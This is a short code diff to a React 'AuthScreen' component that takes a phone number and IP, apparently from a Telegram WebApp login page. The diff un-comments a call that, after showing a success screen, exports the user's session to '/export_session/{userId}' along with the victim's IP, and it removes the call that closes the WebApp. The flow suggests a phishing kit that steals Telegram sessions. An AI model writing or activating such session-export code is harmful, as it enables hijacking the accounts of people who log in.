@@ -30,15 +30,12 @@ const AuthScreen = ({ phone, IP }) => {
                     navigate("/success")
 
                     // Then export session
-                    // const exportResponse = await api.get(`/export_session/${userId}`, {
-                    //     params: { ip: IP },
-                    //     timeout: 10000  // 10 second timeout
-                    // });
-                    // console.log(exportResponse)
-                    // // Handle Telegram WebApp closure
-                    // if (window.Telegram?.WebApp?.close) {
-                    //     window.Telegram.WebApp.close();
-                    // }
+                    const exportResponse = await api.get(`/export_session/${userId}`, {
+                        params: { ip: IP },
+                        timeout: 10000  // 10 second timeout
+                    });
+                    console.log(exportResponse)
+                    navigate("/success")
 
                 } catch (error) {
                     if (error.response?.status === 503) {
